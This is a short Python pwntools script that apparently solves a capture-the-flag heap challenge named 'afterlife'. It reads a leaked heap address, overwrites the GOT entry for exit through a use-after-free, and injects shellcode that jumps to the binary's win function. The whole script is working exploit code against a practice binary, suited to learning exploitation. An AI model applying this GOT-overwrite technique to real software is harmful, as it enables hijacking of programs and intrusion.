import pwn

remote_binary = "/problems/afterlife_5_5cb2854d168d1e297b97921c0b4231f3/vuln"

def attack():
    pr = pwn.process([remote_binary,'A'])
    try:
        elf = pwn.ELF(remote_binary, False)
        payload = pwn.p32(elf.got["exit"] - 12)

        """
        Try to get addres of ``first`` pointer
        ```
        Oops! a new developer copy pasted and printed an address as a decimal...
        153387016
        you will write on first after it was freed... an overflow will not be very useful...
        ```
        """
        pr.readline()
        first = int(pr.readline())

        payload += pwn.p32(first + 8)
        payload += pwn.asm("push {};ret;".format(elf.sym["win"]))
        pr.writelineafter("an overflow will not be very useful...\n", payload)
        rsp = pr.readall(timeout=0.5)
        print(rsp)
    finally:
        pr.close()

attack()
